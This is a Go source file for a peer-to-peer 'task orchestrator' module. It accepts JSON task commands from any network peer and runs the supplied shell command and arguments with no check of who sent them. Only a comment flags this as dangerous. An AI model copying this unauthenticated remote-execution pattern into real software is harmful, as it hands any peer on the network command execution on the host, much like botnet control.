package task_orchestrator

import (
	"context"
	"encoding/json"
	"fmt"
	"log/slog"
	"os/exec"
	"strings"
	"time"

	"github.com/naviNBRuas/APA/pkg/networking"
)

// TaskCommand represents a command to be executed or relayed.
type TaskCommand struct {
	Action    string   `json:"action"`     // EXECUTE, RELAY
	Target    string   `json:"target"`     // PeerID or "ALL"
	Command   string   `json:"command"`    // Shell command to execute
	Args      []string `json:"args"`       // Arguments for the command
	MessageID string   `json:"message_id"` // Unique ID for deduplication
}

// TaskOrchestrator is an example decentralized controller module.
type TaskOrchestrator struct {
	logger      *slog.Logger
	name        string
	p2p         *networking.P2P
	localPeerID string
}

// NewTaskOrchestrator creates a new TaskOrchestrator controller.
func NewTaskOrchestrator(logger *slog.Logger, localPeerID string) *TaskOrchestrator {
	return &TaskOrchestrator{
		logger:      logger,
		name:        "task-orchestrator",
		localPeerID: localPeerID,
	}
}

// SetP2P sets the P2P networking instance.
func (to *TaskOrchestrator) SetP2P(p2p *networking.P2P) {
	to.p2p = p2p
}

// Name returns the name of the controller.
func (to *TaskOrchestrator) Name() string {
	return to.name
}

// Start starts the TaskOrchestrator controller.
func (to *TaskOrchestrator) Start(ctx context.Context) error {
	to.logger.Info("TaskOrchestrator started.")
	go func() {
		for {
			select {
			case <-ctx.Done():
				to.logger.Info("TaskOrchestrator stopped.")
				return
			case <-time.After(5 * time.Second):
				to.logger.Info("TaskOrchestrator performing a task...")
			}
		}
	}()
	return nil
}

// Stop stops the TaskOrchestrator controller.
func (to *TaskOrchestrator) Stop(ctx context.Context) error {
	to.logger.Info("TaskOrchestrator stopping...")
	// Perform any cleanup here
	return nil
}

// Configure is not yet implemented for TaskOrchestrator.
func (to *TaskOrchestrator) Configure(configData []byte) error {
	to.logger.Warn("Configure method not implemented for TaskOrchestrator", "name", to.name)
	return fmt.Errorf("configure method not implemented for TaskOrchestrator")
}

// Status returns a basic status for TaskOrchestrator.
func (to *TaskOrchestrator) Status() (map[string]string, error) {
	status := make(map[string]string)
	status["status"] = "running" // Placeholder
	status["last_task_time"] = time.Now().Format(time.RFC3339)
	return status, nil
}

// HandleMessage logs the received message.
func (to *TaskOrchestrator) HandleMessage(ctx context.Context, message networking.ControllerMessage) error {
	to.logger.Info("TaskOrchestrator received message", "name", to.name, "type", message.Type, "sender", message.SenderPeerID)

	if message.Type != "task_command" {
		return nil
	}

	var cmd TaskCommand
	if err := json.Unmarshal(message.Data, &cmd); err != nil {
		return fmt.Errorf("failed to unmarshal task command: %w", err)
	}

	to.logger.Info("Processing task command", "action", cmd.Action, "target", cmd.Target, "command", cmd.Command)

	// Check if the command is for us
	if cmd.Target != "ALL" && cmd.Target != to.localPeerID {
		to.logger.Debug("Ignoring command not for us", "target", cmd.Target, "local", to.localPeerID)
		return nil
	}
	
	if cmd.Action == "EXECUTE" {
		return to.executeCommand(ctx, cmd)
	} else if cmd.Action == "RELAY" {
		// Relay logic would go here
		// For now, we just log it
		to.logger.Info("Relaying command (not implemented)", "target", cmd.Target)
	}

	return nil
}

func (to *TaskOrchestrator) executeCommand(ctx context.Context, cmd TaskCommand) error {
	to.logger.Info("Executing command", "command", cmd.Command, "args", cmd.Args)
	
	// SECURITY WARNING: Executing arbitrary commands is dangerous.
	// In a production environment, this should be strictly validated and sandboxed.
	
	c := exec.CommandContext(ctx, cmd.Command, cmd.Args...)
	output, err := c.CombinedOutput()
	if err != nil {
		to.logger.Error("Command execution failed", "error", err, "output", string(output))
		return fmt.Errorf("command execution failed: %w", err)
	}
	
	to.logger.Info("Command executed successfully", "output", string(output))
	return nil
}
